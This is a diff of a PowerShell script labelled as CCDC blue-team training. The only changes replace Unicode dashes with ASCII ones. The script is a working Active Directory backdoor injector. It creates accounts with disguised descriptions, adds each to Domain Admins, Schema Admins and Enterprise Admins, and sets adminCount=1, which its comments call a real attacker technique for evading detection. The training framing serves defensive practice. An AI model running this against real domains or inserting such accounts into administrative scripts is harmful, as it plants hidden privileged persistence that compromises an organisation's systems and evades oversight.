@@ -11,7 +11,7 @@
 #Requires -RunAsAdministrator
 #Requires -Modules ActiveDirectory
 
-# ── Colour helpers ────────────────────────────────────────────────────────────
+# -- Colour helpers ------------------------------------------------------------
 function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
 function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
 function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
@@ -19,11 +19,11 @@ function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
 
 Write-Host ""
 Write-Warn  "========================================================"
-Write-Warn  " CCDC Blue Team Training — AD Backdoor User Injector"
+Write-Warn  " CCDC Blue Team Training  -  AD Backdoor User Injector"
 Write-Warn  "========================================================"
 Write-Host ""
 
-# ── Pull domain info dynamically ──────────────────────────────────────────────
+# -- Pull domain info dynamically ----------------------------------------------
 try {
     $Domain     = Get-ADDomain -ErrorAction Stop
     $DomainDN   = $Domain.DistinguishedName          # e.g. DC=corp,DC=local
@@ -36,10 +36,10 @@ try {
     exit 1
 }
 
-# Target OU — Users container (works on any domain without customisation)
+# Target OU  -  Users container (works on any domain without customisation)
 $UsersOU = "CN=Users,$DomainDN"
 
-# ── Groups to add every backdoor user to ─────────────────────────────────────
+# -- Groups to add every backdoor user to -------------------------------------
 # These are the three highest-value groups in a standard AD environment.
 $AdminGroups = @(
     "Domain Admins",
@@ -47,7 +47,7 @@ $AdminGroups = @(
     "Enterprise Admins"
 )
 
-# ── User definitions ──────────────────────────────────────────────────────────
+# -- User definitions ----------------------------------------------------------
 # Format: SamAccountName, DisplayName, password, description (disguise text)
 $EvilUsers = @(
     [PSCustomObject]@{
@@ -80,10 +80,10 @@ foreach ($u in $EvilUsers) {
     $SecurePass = ConvertTo-SecureString $u.Password -AsPlainText -Force
     $UPN        = "$($u.Sam)@$DomainName"
 
-    # ── Create the user ───────────────────────────────────────────────────────
+    # -- Create the user -------------------------------------------------------
     $existing = Get-ADUser -Filter "SamAccountName -eq '$($u.Sam)'" -ErrorAction SilentlyContinue
     if ($existing) {
-        Write-Warn "  User '$($u.Sam)' already exists — skipping creation, will still ensure group membership."
+        Write-Warn "  User '$($u.Sam)' already exists  -  skipping creation, will still ensure group membership."
     } else {
         try {
             New-ADUser `
@@ -110,13 +110,13 @@ foreach ($u in $EvilUsers) {
         }
     }
 
-    # ── Add to admin groups ───────────────────────────────────────────────────
+    # -- Add to admin groups ---------------------------------------------------
     foreach ($group in $AdminGroups) {
         try {
             Add-ADGroupMember -Identity $group -Members $u.Sam -ErrorAction Stop
             Write-Success "  Added to group: $group"
         } catch {
-            # Enterprise Admins only exists in forest root domain — warn gracefully
+            # Enterprise Admins only exists in forest root domain  -  warn gracefully
             if ($group -eq "Enterprise Admins") {
                 Write-Warn "  Could not add to '$group' (only exists in forest root domain): $_"
             } else {
@@ -125,9 +125,9 @@ foreach ($u in $EvilUsers) {
         }
     }
 
-    # ── Extra persistence: set adminCount=1 ──────────────────────────────────
+    # -- Extra persistence: set adminCount=1 ----------------------------------
     # adminCount=1 is set by SDProp on protected accounts. Setting it manually
-    # removes the account from normal ACL inheritance — a real attacker technique
+    # removes the account from normal ACL inheritance  -  a real attacker technique
     # that makes the account harder to spot and restrict via standard tooling.
     try {
         Set-ADUser -Identity $u.Sam -Replace @{adminCount = 1} -ErrorAction Stop
